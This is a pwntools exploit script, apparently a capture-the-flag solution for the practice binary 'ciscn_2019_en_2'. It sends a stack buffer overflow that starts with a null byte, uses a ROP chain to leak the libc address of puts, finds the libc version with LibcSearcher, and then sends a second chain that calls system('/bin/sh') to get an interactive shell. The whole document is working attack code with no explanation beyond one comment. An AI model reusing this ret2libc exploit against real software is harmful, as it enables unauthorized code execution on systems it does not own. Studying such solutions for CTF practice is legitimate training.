from pwn import *
from LibcSearcher import *

#context.log_level = 'debug'

elf = ELF('ciscn_2019_en_2')

p = process('./ciscn_2019_en_2')
#p = remote('node3.buuoj.cn', 25252)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
encrypt_addr = 0x4009a0

pop_rdi_ret = 0x400c83
ret_addr = 0x4006b9

p.recvuntil('Welcome to this Encryption machine\n')
p.sendline('1')

p.recvuntil('Input your Plaintext to be encrypted\n')

payload = b'\0' + b'a' * ( 0x50 + 8 - 1 ) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

p.sendline(payload)
p.recvuntil('Ciphertext\n\n')

puts_real_addr_bytes = p.recvuntil('\n')[:-1].ljust(8,b'\0')

#print(puts_real_addr_bytes)

puts_real_addr = u64(puts_real_addr_bytes)
libc = LibcSearcher('puts', puts_real_addr)

libc_base = puts_real_addr - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_addr = libc_base + libc.dump('str_bin_sh')

p.recvuntil('Input your Plaintext to be encrypted\n')

#system function requires 16bytes stack align, rbp is included in stack, but not ret address
payload = b'\0' + b'a' * ( 0x50 + 8 - 1 ) + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)

p.sendline(payload)

p.interactive()
